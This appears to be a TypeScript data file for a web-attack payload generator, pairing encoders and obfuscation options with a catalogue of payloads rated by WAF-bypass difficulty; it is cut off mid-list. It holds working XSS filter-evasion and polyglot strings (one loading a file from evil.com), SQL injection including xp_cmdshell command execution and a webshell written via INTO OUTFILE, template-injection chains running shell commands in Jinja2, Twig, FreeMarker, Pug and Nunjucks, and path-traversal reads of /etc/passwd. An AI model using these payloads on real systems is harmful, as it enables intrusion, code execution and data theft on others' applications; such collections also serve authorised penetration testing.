export interface PayloadItem {
  id: string;
  name: string;
  payload: string;
  description: string;
  level: string;
  target: string[];
}

export interface PayloadSubcategory {
  id: string;
  name: string;
  payloads: PayloadItem[];
}

export interface PayloadCategory {
  id: string;
  name: string;
  icon: string;
  subcategories: PayloadSubcategory[];
}

export interface Encoder {
  id: string;
  name: string;
  encode: (s: string) => string;
}

export interface Template {
  id: string;
  name: string;
  payload: string;
  description: string;
  category: string;
}

export interface ObfuscationOption {
  id: string;
  name: string;
}

export const targets = ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"];

export const wafLevels = ["Low", "Medium", "Hard", "Extreme"];

export const obfuscationOptions: ObfuscationOption[] = [
  { id: "random-comments", name: "Random Comments" },
  { id: "case-randomize", name: "Case Randomize" },
  { id: "zero-width", name: "Zero-Width Chars" },
  { id: "tab-insert", name: "Tab Insertion" },
];

export const encoders: Encoder[] = [
  {
    id: "url-encode",
    name: "URL Encode",
    encode: (s: string) => encodeURIComponent(s),
  },
  {
    id: "double-url",
    name: "Double URL Encode",
    encode: (s: string) => encodeURIComponent(encodeURIComponent(s)),
  },
  {
    id: "base64",
    name: "Base64",
    encode: (s: string) => {
      const bytes = new TextEncoder().encode(s);
      let binary = "";
      for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
      return btoa(binary);
    },
  },
  {
    id: "hex",
    name: "Hex Encode",
    encode: (s: string) => {
      const bytes = new TextEncoder().encode(s);
      return Array.from(bytes).map(b => `\\x${b.toString(16).padStart(2, "0")}`).join("");
    },
  },
  {
    id: "unicode",
    name: "Unicode Escape",
    encode: (s: string) => {
      return Array.from(s).map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, "0")}`).join("");
    },
  },
  {
    id: "html-entity",
    name: "HTML Entity",
    encode: (s: string) => {
      return s.replace(/&/g, "&#38;")
        .replace(/</g, "&#60;")
        .replace(/>/g, "&#62;")
        .replace(/"/g, "&#34;")
        .replace(/'/g, "&#39;")
        .replace(/ /g, "&#32;");
    },
  },
];

export const payloadCategories: PayloadCategory[] = [
  {
    id: "xss",
    name: "XSS",
    icon: "Code2",
    subcategories: [
      {
        id: "xss-basic",
        name: "Basic XSS",
        payloads: [
          { id: "basic-script", name: "Basic Script", payload: "<script>alert(1)</script>", description: "Basic script tag injection", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "image-onerror", name: "Image Onerror", payload: "<img src=x onerror=alert(1)>", description: "Image tag with onerror event handler", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "svg-onload", name: "SVG Onload", payload: "<svg onload=alert(1)>", description: "SVG element with onload event", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "body-onload", name: "Body Onload", payload: "<body onload=alert(1)>", description: "Body tag with onload handler", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "input-onfocus", name: "Input Onfocus", payload: "<input autofocus onfocus=alert(1)>", description: "Input element with autofocus and onfocus", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "select-onchange", name: "Select Onchange", payload: "<select onchange=alert(1)><option>1<option>2</select>", description: "Select element with onchange trigger", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "iframe-src", name: "IFrame SRC", payload: "<iframe src=javascript:alert(1)>", description: "IFrame with javascript URL", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "link-stylesheet", name: "Link Stylesheet", payload: "<link rel=stylesheet href=javascript:alert(1)>", description: "Link tag with stylesheet and javascript URL", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "meta-refresh", name: "Meta Refresh", payload: "<meta http-equiv=refresh content=\"0;javascript:alert(1)\">", description: "Meta refresh tag with javascript URL", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "div-background", name: "Div Background", payload: "<div style=\"background-image:url(javascript:alert(1))\">", description: "Div with inline style background image", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
        ],
      },
      {
        id: "xss-waf",
        name: "WAF Bypass",
        payloads: [
          { id: "mixed-case", name: "Mixed Case", payload: "<ScRiPt>alert(1)</ScRiPt>", description: "Mixed case script tag bypasses case-sensitive filters", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "html-entity-encode", name: "HTML Entity Encode", payload: "&#60;script&#62;alert(1)&#60;/script&#62;", description: "HTML entity encoded script tag", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "hex-encode-tag", name: "Hex Encode Tag", payload: "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>", description: "Hex encoded eval payload", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "unicode-encode-tag", name: "Unicode Encode Tag", payload: "<script>eval('\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029')</script>", description: "Unicode encoded eval payload", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "base64-eval", name: "Base64 Eval", payload: "<script>eval(atob('YWxlcnQoMSk='))</script>", description: "Base64 encoded eval payload", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "tab-newline", name: "Tab Newline", payload: "<img\nsrc=x\nonerror=alert(1)>", description: "Image tag with tab and newline to bypass filters", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "null-byte", name: "Null Byte", payload: "<scri%00pt>alert(1)</scri%00pt>", description: "Null byte injection to bypass filters", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET"] },
          { id: "comment-bypass", name: "Comment Bypass", payload: "<!--><img src=x onerror=alert(1)>", description: "HTML comment bypass technique", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "nested-script", name: "Nested Script", payload: "<scr<script>ipt>alert(1)</scr</script>ipt>", description: "Nested script tag bypass", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "marquee-onstart", name: "Marquee OnStart", payload: "<marquee onstart=alert(1)>", description: "Marquee element with onstart handler", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "details-ontoggle", name: "Details OnToggle", payload: "<details open ontoggle=alert(1)>", description: "Details element with ontoggle event", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "style-import", name: "Style Import", payload: "<style>@import url('javascript:alert(1)')</style>", description: "Style import with javascript URL", level: "Hard", target: ["PHP", "Node.js", "Python", "ASP.NET"] },
          { id: "anchor-focus", name: "Anchor Focus", payload: "<a href=\"\" onfocus=\"alert(1)\" autofocus>X</a>", description: "Anchor element with onfocus and autofocus", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "keygen-focus", name: "Keygen Focus", payload: "<keygen onfocus=alert(1) autofocus>", description: "Keygen element with onfocus handler", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "video-poster", name: "Video Poster", payload: "<video><source onerror=alert(1)>", description: "Video source with onerror handler", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "body-background", name: "Body Background", payload: "<body background=\"javascript:alert(1)\">", description: "Body tag with background javascript URL", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "table-background", name: "Table Background", payload: "<table background=\"javascript:alert(1)\">", description: "Table tag with background javascript URL", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "input-image", name: "Input Image", payload: "<input type=image src=1 onerror=alert(1)>", description: "Input image with onerror handler", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "function-cons", name: "Function Cons", payload: "<script>[].constructor.constructor('alert(1)')()</script>", description: "Function constructor bypass for eval restrictions", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "Go"] },
          { id: "settimeout-eval", name: "SetTimeout Eval", payload: "<script>setTimeout('alert(1)')</script>", description: "SetTimeout with string argument for eval", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "ruby-oncut", name: "Ruby OnCut", payload: "<ruby x= oncut=alert(1)>", description: "Ruby element with oncut event handler", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "css-animation", name: "CSS Animation", payload: "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=alert(1)>", description: "CSS animation-based XSS trigger", level: "Hard", target: ["PHP", "Node.js", "Python", "ASP.NET"] },
          { id: "onerror-alert", name: "OnError Alert", payload: "<img src=1 onerror=\"javascript:alert(1)\">", description: "Image onerror with javascript protocol", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "form-action", name: "Form Action", payload: "<form action=javascript:alert(1)><input type=submit></form>", description: "Form with javascript action URL", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "isindex-xss", name: "IsIndex XSS", payload: "<isindex type=image src=1 onerror=alert(1)>", description: "Isindex element with onerror handler", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET"] },
          { id: "window-location", name: "Window Location", payload: "<script>location='javascript:alert(1)'</script>", description: "Window location assignment XSS", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "import-href", name: "Import HREF", payload: "<link rel=\"import\" href=\"javascript:alert(1)\">", description: "Link import with javascript URL", level: "Hard", target: ["PHP", "Node.js", "Python"] },
          { id: "onpointer-raw", name: "OnPointer Raw", payload: "<div onpointerrawupdate=alert(1)>X", description: "Pointer raw update event handler", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "onbeforeinput", name: "OnBeforeInput", payload: "<input onbeforeinput=alert(1)>", description: "Before input event handler XSS", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "embed-flash", name: "Embed Flash", payload: "<embed code=\"http://evil.com/xss.swf\" allowscriptaccess=always>", description: "Flash embed with external SWF", level: "Hard", target: ["PHP", "Node.js", "Python", "ASP.NET"] },
          { id: "auxclick-event", name: "AuxClick Event", payload: "<img src=x onauxclick=alert(1)>", description: "AuxClick event handler XSS", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "noscript-bypass", name: "Noscript Bypass", payload: "<noscript><img src=x onerror=alert(1)></noscript>", description: "Noscript tag wrapper bypass", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
        ],
      },
      {
        id: "xss-polyglot",
        name: "Polyglot",
        payloads: [
          { id: "classic-polyglot", name: "Classic Polyglot", payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0D%0A<!--</sCrIpT>", description: "Universal polyglot payload for multiple contexts", level: "Extreme", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "polyglot-image", name: "Polyglot Image", payload: "\"'><img src=x onerror=alert(1)>", description: "Polyglot image tag injection", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "polyglot-script", name: "Polyglot Script", payload: "\"'></script><script>alert(1)</script>", description: "Polyglot script tag closure", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "triple-quote", name: "Triple Quote", payload: "\"'`><img src=x onerror=alert(1)>", description: "Triple quote polyglot injection", level: "Extreme", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "svg-polyglot", name: "SVG Polyglot", payload: "<svg/onload=alert(1)//", description: "SVG polyglot with self-closing", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "xml-polyglot", name: "XML Polyglot", payload: "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(1)</x:script>", description: "XML namespace polyglot script", level: "Extreme", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "polyglot-json", name: "Polyglot JSON", payload: "{\"a\":\"<img src=x onerror=alert(1)>\"}", description: "JSON polyglot with embedded XSS", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
        ],
      },
      {
        id: "xss-dom",
        name: "DOM-Based",
        payloads: [
          { id: "location-hash", name: "Location Hash", payload: "#<img/src=x/onerror=alert(1)>", description: "DOM XSS via location hash fragment", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "doc-write", name: "Doc Write", payload: "\"><svg onload=alert(1)>", description: "DOM XSS via document.write sink", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "innerhtml-sink", name: "InnerHTML Sink", payload: "<img src=x onerror=alert(1)>", description: "DOM XSS via innerHTML sink", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "window-name", name: "Window Name", payload: "alert(document.cookie)//", description: "DOM XSS via window.name property", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "referer-inj", name: "Referer Inj", payload: "javascript:alert(document.domain)//", description: "DOM XSS via document.referrer injection", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "postmessage", name: "PostMessage", payload: "self:xss", description: "DOM XSS via postMessage event", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "eval-sink", name: "Eval Sink", payload: "1;alert(1)", description: "DOM XSS via eval() sink", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "settimeout-sink", name: "SetTimeout Sink", payload: "1;alert(1)//", description: "DOM XSS via setTimeout sink", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "onhashchange", name: "OnHashChange", payload: "javascript:alert(1)//", description: "DOM XSS via onhashchange event", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
        ],
      },
    ],
  },
  {
    id: "sqli",
    name: "SQLi",
    icon: "Database",
    subcategories: [
      {
        id: "sqli-union",
        name: "Union Based",
        payloads: [
          { id: "union-select-1", name: "UNION SELECT 1", payload: "' UNION SELECT 1--", description: "Basic UNION SELECT with single column", level: "Low", target: ["PHP", "Java", "Python", "ASP.NET", "Go"] },
          { id: "union-select-multi", name: "UNION SELECT Multiple", payload: "' UNION SELECT 1,2,3,4,5--", description: "UNION SELECT with multiple columns", level: "Low", target: ["PHP", "Java", "Python", "ASP.NET", "Go"] },
          { id: "or-1-1", name: "OR 1=1", payload: "' OR 1=1--", description: "Basic OR condition bypass", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "comment-bypass-sqli", name: "Comment Bypass", payload: "' OR 1=1 /*", description: "Comment-based SQL injection", level: "Low", target: ["PHP", "Java", "Python", "ASP.NET"] },
          { id: "no-spaces", name: "No Spaces", payload: "'/**/OR/**/1=1/**/--", description: "Inline comments replace spaces", level: "Medium", target: ["PHP", "Java", "Python", "ASP.NET"] },
          { id: "inline-comment", name: "Inline Comment", payload: "' UNION/**/SELECT/**/1,2,3--", description: "Inline comment in UNION SELECT", level: "Medium", target: ["PHP", "Java", "Python", "ASP.NET"] },
          { id: "hex-encoding", name: "Hex Encoding", payload: "' OR 0x1=1--", description: "Hex encoded value injection", level: "Medium", target: ["PHP", "Java", "Python", "ASP.NET"] },
          { id: "url-encode-sqli", name: "URL Encode", payload: "%27%20OR%201%3D1--", description: "URL encoded SQL injection", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "double-url-sqli", name: "Double URL Encode", payload: "%2527%2520OR%25201%253D1--", description: "Double URL encoded to bypass decoding filters", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET"] },
          { id: "char-function", name: "CHAR Function", payload: "' OR 1=CHAR(49)--", description: "MySQL CHAR function bypass", level: "Medium", target: ["PHP", "Python", "ASP.NET"] },
          { id: "null-byte-sqli", name: "Null Byte", payload: "' OR 1=1%00--", description: "Null byte truncation trick", level: "Hard", target: ["PHP", "Python"] },
          { id: "plus-sign", name: "Plus Sign", payload: "'+OR+1=1--", description: "Plus sign as space alternative", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "broken-keyword", name: "Broken Keyword", payload: "' UN/**/ION SEL/**/ECT 1,2,3--", description: "Broken keywords with inline comments", level: "Medium", target: ["PHP", "Java", "Python", "ASP.NET"] },
          { id: "hex-keyword", name: "Hex Keyword", payload: "' UNION SELECT 0x312c32--", description: "Hex encoding of column values", level: "Hard", target: ["PHP", "Java", "Python"] },
          { id: "wide-column-20", name: "Wide Column 20", payload: "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--", description: "Wide column UNION SELECT (20 columns)", level: "Medium", target: ["PHP", "Java", "Python", "ASP.NET", "Go"] },
          { id: "xp-cmdshell", name: "xp_cmdshell", payload: "'; EXEC xp_cmdshell('whoami')--", description: "MSSQL xp_cmdshell RCE", level: "Extreme", target: ["ASP.NET"] },
          { id: "into-outfile", name: "INTO OUTFILE", payload: "' UNION SELECT 1,2 INTO OUTFILE '/var/www/shell.php'--", description: "MySQL INTO OUTFILE write webshell", level: "Extreme", target: ["PHP"] },
          { id: "negative-column", name: "Negative Column", payload: "' UNION SELECT -1,2,3--", description: "Negative column index bypass", level: "Medium", target: ["PHP", "Java", "Python", "ASP.NET"] },
          { id: "tab-bypass", name: "Tab Bypass", payload: "'\tOR\t1=1--", description: "Tab character as space bypass", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "newline-bypass", name: "Newline Bypass", payload: "'\nOR\n1=1--", description: "Newline as space bypass", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "double-pipe", name: "Double Pipe", payload: "' || 1=1--", description: "Oracle double pipe concatenation", level: "Medium", target: ["Java", "Python"] },
          { id: "ampersand", name: "Ampersand", payload: "' & 1=1--", description: "Bitwise AND operator bypass", level: "Medium", target: ["PHP", "Java", "Python", "ASP.NET"] },
          { id: "backslash-escape", name: "Backslash Escape", payload: "' OR 1=1;%5c", description: "Backslash escape sequence injection", level: "Hard", target: ["PHP", "Node.js", "Java", "Python"] },
          { id: "case-randomize-sqli", name: "Case Randomize", payload: "' Or 1=1--", description: "Mixed case SQL keyword bypass", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "number-obfuscate", name: "Number Obfuscate", payload: "' OR 0x1=0x1--", description: "Hex number obfuscation", level: "Medium", target: ["PHP", "Java", "Python", "ASP.NET"] },
          { id: "and-false", name: "AND False", payload: "' AND 1=2--", description: "AND false conditional for blind injection", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "order-by", name: "ORDER BY", payload: "' ORDER BY 1--", description: "ORDER BY column enumeration", level: "Low", target: ["PHP", "Java", "Python", "ASP.NET", "Go"] },
        ],
      },
      {
        id: "sqli-error",
        name: "Error Based",
        payloads: [
          { id: "mysql-extractvalue", name: "MySQL ExtractValue", payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))--", description: "MySQL ExtractValue error-based injection", level: "Medium", target: ["PHP", "Java", "Python", "ASP.NET"] },
          { id: "mysql-updatexml", name: "MySQL UpdateXML", payload: "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version)), 1)--", description: "MySQL UpdateXML error-based injection", level: "Medium", target: ["PHP", "Java", "Python", "ASP.NET"] },
          { id: "mysql-double-query", name: "MySQL Double Query", payload: "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) y)--", description: "MySQL double query error injection", level: "Hard", target: ["PHP", "Python"] },
          { id: "mssql-convert", name: "MSSQL Convert", payload: "'; SELECT CONVERT(int, @@version)--", description: "MSSQL CONVERT error-based injection", level: "Medium", target: ["ASP.NET"] },
          { id: "postgres-cast", name: "PostgreSQL CAST", payload: "' UNION SELECT CAST(@@version AS numeric)--", description: "PostgreSQL CAST error injection", level: "Medium", target: ["Python", "PHP"] },
          { id: "oracle-xmltype", name: "Oracle XMLType", payload: "' AND EXTRACTVALUE(XMLTYPE('<foo>'||(SELECT banner FROM v$version)||'</foo>'), '/foo')--", description: "Oracle XMLType error injection", level: "Hard", target: ["Java", "Python"] },
        ],
      },
      {
        id: "sqli-blind",
        name: "Blind Based",
        payloads: [
          { id: "boolean-true", name: "Boolean True", payload: "' AND 1=1--", description: "Boolean true condition for blind injection", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "boolean-false", name: "Boolean False", payload: "' AND 1=2--", description: "Boolean false condition for blind injection", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "time-sleep-mysql", name: "Time Sleep MySQL", payload: "' AND SLEEP(5)--", description: "MySQL time-based blind SLEEP", level: "Medium", target: ["PHP", "Java", "Python", "ASP.NET"] },
          { id: "time-wait-mssql", name: "Time Wait MSSQL", payload: "'; WAITFOR DELAY '0:0:5'--", description: "MSSQL time-based WAITFOR DELAY", level: "Medium", target: ["ASP.NET"] },
          { id: "time-pg-sleep", name: "Time PG Sleep", payload: "'; SELECT pg_sleep(5)--", description: "PostgreSQL time-based pg_sleep", level: "Medium", target: ["Python", "PHP"] },
          { id: "benchmark", name: "BENCHMARK", payload: "' AND BENCHMARK(5000000, MD5('test'))--", description: "MySQL BENCHMARK heavy query timing", level: "Hard", target: ["PHP", "Python"] },
          { id: "like-check", name: "Like Check", payload: "' AND 1=1 LIKE 1--", description: "LIKE operator blind injection check", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
        ],
      },
    ],
  },
  {
    id: "ssti",
    name: "SSTI",
    icon: "Braces",
    subcategories: [
      {
        id: "ssti-general",
        name: "General SSTI",
        payloads: [
          { id: "jinja2-basic-math", name: "Jinja2 Basic Math", payload: "{{7*7}}", description: "Jinja2 template math expression test", level: "Low", target: ["Python"] },
          { id: "twig-basic", name: "Twig Basic", payload: "{{7*7}}", description: "Twig template math expression test", level: "Low", target: ["PHP"] },
          { id: "jade-pug", name: "Jade/Pug", payload: "#{7*7}", description: "Jade/Pug template expression test", level: "Low", target: ["Node.js"] },
          { id: "freemarker", name: "FreeMarker", payload: "${7*7}", description: "FreeMarker template expression", level: "Low", target: ["Java"] },
          { id: "velocity", name: "Velocity", payload: "$7*7", description: "Apache Velocity template expression", level: "Low", target: ["Java"] },
          { id: "smarty", name: "Smarty", payload: "{$7*7}", description: "Smarty template expression test", level: "Low", target: ["PHP"] },
          { id: "jinja2-rce-mro", name: "Jinja2 RCE MRO", payload: "{{''.__class__.__mro__[2].__subclasses__()}}", description: "Jinja2 MRO chain for RCE discovery", level: "Extreme", target: ["Python"] },
          { id: "jinja2-config", name: "Jinja2 Config Dump", payload: "{{config}}", description: "Jinja2 config object dump", level: "Medium", target: ["Python"] },
          { id: "freemarker-rce", name: "FreeMarker RCE", payload: "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}", description: "FreeMarker RCE via reflection", level: "Extreme", target: ["Java"] },
          { id: "twig-rce", name: "Twig RCE", payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", description: "Twig RCE via filter callback", level: "Extreme", target: ["PHP"] },
          { id: "jinja2-file", name: "Jinja2 File Read", payload: "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}", description: "Jinja2 file read via subclass", level: "Extreme", target: ["Python"] },
          { id: "pug-rce", name: "Pug RCE", payload: "-#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad('child_process').execSync('id')}()}", description: "Pug RCE via function execution", level: "Extreme", target: ["Node.js"] },
          { id: "jinja2-print-bypass", name: "Jinja2 Print Bypass", payload: "{% print 7*7 %}", description: "Jinja2 print statement bypass", level: "Medium", target: ["Python"] },
          { id: "thymeleaf", name: "Thymeleaf", payload: "[[${7*7}]]", description: "Thymeleaf inline expression", level: "Low", target: ["Java"] },
          { id: "jinja2-string-test", name: "Jinja2 String Test", payload: "{{'test'|upper}}", description: "Jinja2 string filter test", level: "Low", target: ["Python"] },
          { id: "jinja2-hex-evasion", name: "Jinja2 Hex Evasion", payload: "{{''['\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f']}}", description: "Jinja2 hex encoded attribute bypass", level: "Hard", target: ["Python"] },
          { id: "smarty-rce", name: "Smarty RCE", payload: "{php}echo shell_exec('id');{/php}", description: "Smarty PHP code execution", level: "Extreme", target: ["PHP"] },
          { id: "jinja2-lipsum", name: "Jinja2 Lipsum", payload: "{{lipsum.__globals__['os'].popen('id').read()}}", description: "Jinja2 lipsum RCE via os module", level: "Extreme", target: ["Python"] },
          { id: "jinja2-self-rce", name: "Jinja2 Self RCE", payload: "{{self.__init__.__globals__.__builtins__['__import__']('os').popen('id').read()}}", description: "Jinja2 self object RCE", level: "Extreme", target: ["Python"] },
          { id: "jinja2-set-block", name: "Jinja2 Set Block", payload: "{% set s = \"test\" %}{{s}}", description: "Jinja2 set variable block bypass", level: "Medium", target: ["Python"] },
          { id: "freemarker-alt", name: "FreeMarker Alt", payload: "${7*7}", description: "FreeMarker alternative expression", level: "Low", target: ["Java"] },
          { id: "jinja2-urlfor", name: "Jinja2 URLFor", payload: "{{url_for.__globals__['os'].popen('id').read()}}", description: "Jinja2 url_for RCE via globals", level: "Extreme", target: ["Python"] },
          { id: "jinja2-getitem", name: "Jinja2 GetItem", payload: "{{''.__class__.__mro__[1].__subclasses__()}}", description: "Jinja2 __getitem__ subclass enumeration", level: "Hard", target: ["Python"] },
          { id: "jinja2-dict", name: "Jinja2 Dict", payload: "{{dict.__base__.__subclasses__()}}", description: "Jinja2 dict base subclass access", level: "Hard", target: ["Python"] },
          { id: "twig-sandbox", name: "Twig Sandbox", payload: "{{['id']|filter('system')}}", description: "Twig sandbox escape via filter", level: "Extreme", target: ["PHP"] },
          { id: "nunjucks-rce", name: "Nunjucks RCE", payload: "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}", description: "Nunjucks RCE via constructor chain", level: "Extreme", target: ["Node.js"] },
        ],
      },
    ],
  },
  {
    id: "lfi",
    name: "LFI",
    icon: "FolderOpen",
    subcategories: [
      {
        id: "lfi-basic",
        name: "Basic LFI",
        payloads: [
          { id: "basic-unix", name: "Basic Unix", payload: "../../../etc/passwd", description: "Basic directory traversal on Unix", level: "Low", target: ["PHP", "Python", "Go", "Java"] },
          { id: "basic-windows", name: "Basic Windows", payload: "..\\..\\..\\windows\\win.ini", description: "Basic directory traversal on Windows", level: "Low", target: ["PHP", "Python", "ASP.NET", "Java"] },
          { id: "double-encode", name: "Double Encode", payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64", description: "Double URL encoded path traversal", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "php-filter-b64", name: "PHP Filter B64", payload: "php://filter/convert.base64-encode/resource=index.php", description: "PHP filter wrapper base64 read", level: "Medium", target: ["PHP"] },
          { id: "null-byte-lfi", name: "Null Byte", payload: "../../../etc/passwd%00", description: "Null byte truncation for older PHP", level: "Hard", target: ["PHP"] },
          { id: "php-rot13", name: "PHP ROT13", payload: "php://filter/read=string.rot13/resource=index.php", description: "PHP ROT13 filter read", level: "Medium", target: ["PHP"] },
          { id: "php-chained", name: "PHP Chained", payload: "php://filter/convert.base64-encode|convert.base64-encode/resource=index.php", description: "PHP chained filter encoding", level: "Hard", target: ["PHP"] },
          { id: "path-truncation", name: "Path Truncation", payload: "../../../etc/passwd..........", description: "Path truncation for older PHP", level: "Hard", target: ["PHP"] },
          { id: "zip-wrapper", name: "Zip Wrapper", payload: "zip://path/to/file.zip#file.txt", description: "PHP zip wrapper file read", level: "Hard", target: ["PHP"] },
          { id: "phar-deser", name: "Phar Deser", payload: "phar://path/to/file.phar", description: "PHP phar deserialization", level: "Extreme", target: ["PHP"] },
          { id: "double-dot", name: "Double Dot", payload: "....//....//....//etc/passwd", description: "Double dot bypass for simple filters", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "Go"] },
          { id: "semicolon-lfi", name: "Semicolon", payload: "..;/..;/..;/etc/passwd", description: "Semicolon path traversal bypass", level: "Medium", target: ["PHP", "Java"] },
          { id: "double-url-lfi", name: "Double URL", payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", description: "Double URL encoding for WAF bypass", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET"] },
